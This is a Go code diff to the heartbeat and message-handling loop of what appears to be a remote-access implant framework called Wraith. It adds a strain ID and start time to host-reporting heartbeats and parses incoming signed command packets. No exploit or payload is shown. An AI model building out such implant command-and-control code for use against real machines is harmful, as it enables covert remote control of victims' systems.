@@ -86,6 +86,8 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		// Cache some values used in the heartbeat.
 
 		fingerprint := w.GetFingerprint()
+		strain := w.GetStrainId()
+		initTime := w.GetInitTime()
 		hostname, err := os.Hostname()
 		if err != nil {
 			hostname = "<unknown>"
@@ -113,6 +115,8 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				// Build a heartbeat data packet.
 				heartbeatData := proto.PacketHeartbeat{
 					Fingerprint: fingerprint,
+					StrainId:    strain,
+					InitTime:    initTime,
 					HostOS:      runtime.GOOS,
 					HostArch:    runtime.GOARCH,
 					Hostname:    hostname,
@@ -147,10 +151,15 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		// Trigger exit when requested.
 		case <-ctx.Done():
 			return
-		// Process incoming requests.
-		case <-recv:
-			// TODO
-			println("received message")
+		// Process incoming packets.
+		case packet := <-recv:
+			switch packet.Route {
+			case proto.ROUTE_REQUEST:
+				// TODO: Prevent replay attacks
+				packetData := proto.PacketReq{}
+				proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
+				fmt.Printf("%v\n", packetData)
+			}
 		}
 	}
 }
